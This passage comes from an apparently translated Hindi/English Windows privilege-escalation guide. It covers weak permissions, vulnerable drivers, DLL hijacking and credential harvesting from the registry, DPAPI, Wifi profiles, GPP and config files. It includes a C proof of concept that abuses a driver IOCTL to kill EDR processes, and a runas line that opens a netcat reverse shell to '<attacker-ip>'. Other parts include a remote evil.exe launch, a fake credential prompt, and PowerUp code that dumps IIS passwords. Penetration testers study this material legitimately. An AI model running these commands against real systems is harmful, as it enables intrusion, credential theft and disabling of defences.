Windows उपयोगकर्ताओं को यह निर्दिष्ट करने की अनुमति देता है कि यदि कोई सर्विस fail हो जाए तो कौन-सी क्रियाएँ की जाएँ। इस फीचर को किसी binary की ओर पॉइंट करने के लिए कॉन्फ़िगर किया जा सकता है। यदि यह binary replaceable है, तो privilege escalation संभव हो सकता है। More details can be found in the [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## एप्लिकेशन

### इंस्टॉल किए गए एप्लिकेशन

Check **binaries की अनुमतियाँ** (शायद आप किसी को overwrite करके privilege escalation कर सकें) और **फ़ोल्डर्स** की भी जाँच करें ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Write Permissions

जाँच करें कि क्या आप किसी config file को बदल कर किसी विशेष फ़ाइल पढ़ सकते हैं, या क्या आप किसी binary को बदल सकते हैं जो Administrator account (schedtasks) द्वारा चलाया जाएगा।

सिस्टम में कमजोर folder/files permissions खोजने का एक तरीका है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### स्टार्टअप पर चलाएँ

**जाँचें कि क्या आप किसी registry या binary को overwrite कर सकते हैं जिसे किसी दूसरे user द्वारा execute किया जाएगा।**\
**पढ़ें** इस **निम्नलिखित पृष्ठ** को ताकि आप रोचक **autoruns locations to escalate privileges** के बारे में और जान सकें:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

संभावित **third party weird/vulnerable** drivers की तलाश करें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
यदि कोई ड्राइवर arbitrary kernel read/write primitive एक्सपोज़ करता है (कमजोर तरीके से डिजाइन किए गए IOCTL handlers में आम), तो आप kernel memory से सीधे SYSTEM token चुरा कर privilege escalate कर सकते हैं। चरण-दर-चरण तकनीक यहाँ देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

कुछ signed third‑party drivers अपने device object को मजबूत SDDL के साथ IoCreateDeviceSecure के माध्यम से बनाते हैं, लेकिन DeviceCharacteristics में FILE_DEVICE_SECURE_OPEN सेट करना भूल जाते हैं। इस फ़्लैग के बिना, secure DACL उस समय लागू नहीं होती जब डिवाइस को किसी ऐसे path से खोला जाता है जिसमें एक अतिरिक्त component हो, जिससे कोई भी unprivileged user निम्नलिखित namespace path का उपयोग करके एक handle प्राप्त कर सकता है:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (एक वास्तविक मामले से)

एक बार user डिवाइस खोल सके, ड्राइवर द्वारा expose किए गए privileged IOCTLs का दुरुपयोग LPE और tampering के लिए किया जा सकता है। वास्तविक दुनिया में देखी गई उदाहरण क्षमताएँ:
- किसी भी arbitrary processes को full-access handles लौटाना (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (ऑफ़लाइन tampering, boot-time persistence tricks).
- किसी भी arbitrary processes को terminate करना, जिसमें Protected Process/Light (PP/PPL) भी शामिल है, जिससे user land से kernel के माध्यम से AV/EDR kill करना संभव होता है।

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- ऐसे device objects बनाते समय जो DACL से restricted होने चाहिए, हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- privileged operations के लिए caller context को वैध करें। process termination या handle returns की अनुमति देने से पहले PP/PPL checks जोड़ें।
- IOCTLs को सीमित करें (access masks, METHOD_*, input validation) और direct kernel privileges के बजाय brokered models पर विचार करें।

Detection ideas for defenders
- suspicious device names (e.g., \\ .\\amsdk*) के user-mode opens की निगरानी करें और misuse का संकेत देने वाली specific IOCTL sequences पर ध्यान दें।
- Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) को लागू करें और अपनी allow/deny सूचियाँ बनाए रखें।


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस चेक का दुरुपयोग करने के बारे में अधिक जानकारी के लिए:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## नेटवर्क

### शेयर
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file में हार्ड-कोडेड अन्य ज्ञात कंप्यूटरों की जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

बाहरी से **restricted services** की जांच करें
```bash
netstat -ano #Opened ports?
```
### राउटिंग तालिका
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP तालिका
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall नियम

[**Firewall संबंधित commands के लिए इस पृष्ठ को देखें**](../basic-cmd-for-pentesters.md#firewall) **(नियमों की सूची, नियम बनाना, बंद करना, बंद करना...)**

अधिक[ नेटवर्क enumeration के लिए commands यहाँ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
बाइनरी `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी पाया जा सकता है।

यदि आप root user प्राप्त कर लेते हैं तो आप किसी भी पोर्ट पर listen कर सकते हैं (पहली बार जब आप `nc.exe` को किसी पोर्ट पर listen करने के लिए उपयोग करेंगे तो यह GUI के माध्यम से पूछेगा कि `nc` को firewall द्वारा अनुमति दी जानी चाहिए या नहीं)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash को आसानी से root के रूप में शुरू करने के लिए, आप `--default-user root` आज़मा सकते हैं।

आप `WSL` फ़ाइलसिस्टम को इस फ़ोल्डर में एक्सप्लोर कर सकते हैं: `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault उन सर्वरों, वेबसाइटों और अन्य प्रोग्रामों के लिए उपयोगकर्ता क्रेडेंशियल्स संग्रहीत करता है जिनमें **Windows** **स्वचालित रूप से उपयोगकर्ताओं को लॉग इन कर सकता है**। पहली नज़र में ऐसा लग सकता है कि उपयोगकर्ता अपने Facebook, Twitter, Gmail आदि के क्रेडेंशियल्स यहाँ स्टोर कर सकते हैं ताकि वे ब्राउज़र्स के माध्यम से स्वतः लॉग इन हो जाएँ। पर ऐसा नहीं है।

Windows Vault उन क्रेडेंशियल्स को संग्रहीत करता है जिनसे **Windows** उपयोगकर्ताओं को स्वचालित रूप से लॉग इन किया जा सकता है, जिसका अर्थ यह है कि कोई भी **Windows application जो किसी संसाधन (server या वेबसाइट) तक पहुँचने के लिए credentials की आवश्यकता रखता है** **Credential Manager का उपयोग कर सकता है** और Windows Vault का प्रयोग कर सकता है और दिए गए क्रेडेंशियल्स का उपयोग कर सकता है, ताकि उपयोगकर्ता बार‑बार username और password न दर्ज करें।

जब तक applications Credential Manager के साथ इंटरैक्ट नहीं करते, मुझे नहीं लगता कि वे किसी दिए हुए संसाधन के लिए क्रेडेंशियल्स का उपयोग कर पाएँगे। इसलिए, यदि आपकी application vault का उपयोग करना चाहती है, तो उसे किसी तरह **credential manager के साथ संवाद करना और उस संसाधन के लिए क्रेडेंशियल्स का अनुरोध करना** चाहिए डिफ़ॉल्ट storage vault से।

मशीन पर स्टोर किए गए क्रेडेंशियल्स की सूची देखने के लिए `cmdkey` का उपयोग करें।
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
फिर आप सहेजे गए क्रेडेंशियल्स का उपयोग करने के लिए `runas` को `/savecred` विकल्प के साथ उपयोग कर सकते हैं। निम्नलिखित उदाहरण एक रिमोट बाइनरी को SMB share के माध्यम से कॉल कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
प्रदान किए गए credential के साथ `runas` का उपयोग।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** डेटा के symmetric encryption के लिए एक तरीका प्रदान करता है, जो मुख्य रूप से Windows ऑपरेटिंग सिस्टम में asymmetric private keys के symmetric encryption के लिए इस्तेमाल होता है। यह encryption उपयोगकर्ता या सिस्टम secret का उपयोग करके entropy में महत्वपूर्ण योगदान देता है।

**DPAPI उपयोगकर्ता के लॉगिन secrets से व्युत्पन्न एक symmetric key के माध्यम से keys के encryption को सक्षम बनाता है**। सिस्टम encryption के मामलों में यह सिस्टम के domain authentication secrets का उपयोग करता है।

DPAPI का उपयोग करके encrypted user RSA keys %APPDATA%\Microsoft\Protect\{SID} directory में संग्रहीत होते हैं, जहाँ {SID} उपयोगकर्ता का [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) दर्शाता है। **The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**, आमतौर पर 64 bytes का random data होता है। (यह ध्यान देने योग्य है कि इस directory तक access restricted है, इसलिए इसकी contents को `dir` command in CMD से list करना संभव नहीं है, हालाँकि इसे PowerShell के माध्यम से सूचीबद्ध किया जा सकता है)।
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप उपयुक्त तर्क (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग करके इसे decrypt कर सकते हैं।

**credentials files protected by the master password** आमतौर पर निम्न स्थानों पर पाए जाते हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
आप उपयुक्त `/masterkey` के साथ **mimikatz module** `dpapi::cred` का उपयोग करके डिक्रिप्ट कर सकते हैं।\
आप `sekurlsa::dpapi` module के साथ **memory** से कई **DPAPI masterkeys** निकाल सकते हैं (यदि आप **root** हैं)।

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell क्रेडेंशियल्स

**PowerShell क्रेडेंशियल्स** अक्सर एन्क्रिप्टेड क्रेडेंशियल्स को सुविधाजनक रूप से स्टोर करने के लिए **scripting** और automation tasks में उपयोग किए जाते हैं। ये क्रेडेंशियल्स **DPAPI** का उपयोग करके सुरक्षित होते हैं, जिसका आमतौर पर मतलब यह होता है कि इन्हें केवल उसी उपयोगकर्ता द्वारा उसी कंप्यूटर पर डिक्रिप्ट किया जा सकता है जहाँ इन्हें बनाया गया था।

किसी फाइल में मौजूद PS क्रेडेंशियल्स को **डिक्रिप्ट** करने के लिए आप कर सकते हैं:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### सहेजे गए RDP कनेक्शन

आप इन्हें पा सकते हैं `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\` में

### हाल ही में चलाए गए कमांड
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files`\
आप उपयुक्त `/masterkey` के साथ **Mimikatz** `dpapi::rdg` module का उपयोग करके किसी भी .rdg फ़ाइलों को **डिक्रिप्ट** कर सकते हैं।\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module
आप Mimikatz `sekurlsa::dpapi` module के साथ मेमोरी से कई DPAPI masterkeys **निकाल सकते हैं**।

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.
लोग अक्सर Windows workstations पर StickyNotes app का उपयोग पासवर्ड और अन्य जानकारी **सहेजने** के लिए करते हैं, यह समझे बिना कि यह एक डेटाबेस फ़ाइल है। यह फ़ाइल `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` पर स्थित है और इसे ढूंढना और जांचना हमेशा उपयोगी रहता है।

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
यदि यह फ़ाइल मौजूद है तो संभव है कि कुछ **credentials** कॉन्फ़िगर किए गए हों और उन्हें **पुनःप्राप्त** किया जा सके।

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जांचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है .\
इंस्टॉलर **SYSTEM privileges के साथ चलाए जाते हैं**, कई **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फ़ाइलें और रजिस्ट्री (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys registry key `HKCU\Software\OpenSSH\Agent\Keys` के अंदर संग्रहीत हो सकते हैं, इसलिए आपको जांचना चाहिए कि वहाँ कुछ दिलचस्प है या नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
यदि आपको उस पथ के भीतर कोई एंट्री मिलती है तो यह शायद सहेजा हुआ SSH key होगा। यह एन्क्रिप्टेड रूप में संग्रहीत होता है लेकिन इसे आसानी से निम्न का उपयोग करके डिक्रिप्ट किया जा सकता है: [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
इस तकनीक के बारे में अधिक जानकारी यहाँ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` सेवा चल नहीं रही है और आप चाहते हैं कि यह बूट पर स्वतः शुरू हो तो चलाएँ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह तकनीक अब मान्य नहीं है। मैंने कुछ ssh keys बनाने, उन्हें `ssh-add` से जोड़ने और ssh के माध्यम से एक मशीन पर लॉगिन करने की कोशिश की। रजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फ़ाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM बैकअप्स
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud प्रमाण-पत्र
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

एक फ़ाइल **SiteList.xml** खोजें

### Cached GPP Pasword

एक सुविधा पहले उपलब्ध थी जो Group Policy Preferences (GPP) के माध्यम से मशीनों के समूह पर कस्टम लोकल प्रशासक खाते तैनात करने की अनुमति देती थी। हालाँकि, इस तरीके में महत्वपूर्ण सुरक्षा खामियाँ थीं। सबसे पहले, Group Policy Objects (GPOs), जो SYSVOL में XML फाइलों के रूप में संग्रहीत होते हैं, किसी भी domain उपयोगकर्ता द्वारा एक्सेस किए जा सकते थे। दूसरी बात, इन GPPs के अंदर के पासवर्ड, जो AES256 से public रूप से documented default key का उपयोग करके encrypted थे, किसी भी authenticated user द्वारा decrypt किए जा सकते थे। यह एक गंभीर जोखिम उत्पन्न करता था, क्योंकि इससे उपयोगकर्ता elevated privileges प्राप्त कर सकते थे।

इस जोखिम को कम करने के लिए एक फ़ंक्शन विकसित किया गया था जो स्थानीय रूप से कैश किए गए उन GPP फाइलों की स्कैनिंग करता है जिनमें एक खाली न होने वाला "cpassword" फ़ील्ड होता है। ऐसा फ़ाइल मिलने पर, फ़ंक्शन पासवर्ड को decrypt कर देता है और एक custom PowerShell object लौटाता है। यह object GPP और फ़ाइल के स्थान के बारे में विवरण शामिल करता है, जो इस सुरक्षा दोष की पहचान और remediation में मदद करता है।

इन फ़ाइलों के लिए `C:\ProgramData\Microsoft\Group Policy\history` या _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista से पहले)_ में खोजें:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को डिक्रिप्ट करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
passwords प्राप्त करने के लिए crackmapexec का उपयोग:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials के साथ web.config का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग्स
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials के लिए पूछें

आप हमेशा **उपयोगकर्ता से उसके credentials या यहां तक कि किसी अन्य उपयोगकर्ता के credentials दर्ज करने को कह सकते हैं** अगर आपको लगता है कि वह उन्हें जान सकता है (ध्यान दें कि क्लाइंट से सीधे **माँगना** — यानी उसके **credentials** के लिए सीधे पूछना — वास्तव में **जोखिम भरा** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **credentials वाले संभावित फ़ाइल नाम**

जानी-पहचानी फ़ाइलें जिनमें कुछ समय पहले **passwords** **clear-text** या **Base64** में मौजूद थे
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
